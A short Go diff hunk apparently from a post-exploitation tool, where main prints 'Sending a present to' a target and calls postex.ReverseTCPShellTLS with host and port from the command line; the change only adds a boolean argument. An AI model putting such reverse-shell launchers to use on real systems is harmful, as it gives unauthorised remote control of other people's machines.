@@ -22,5 +22,5 @@ func main() {
 	}
 	//let's do it!
 	fmt.Println("Sending a present to", host + ":" + os.Args[2])
-	postex.ReverseTCPShellTLS(filepath, host, port)
+	postex.ReverseTCPShellTLS(filepath, host, port, true)
 }
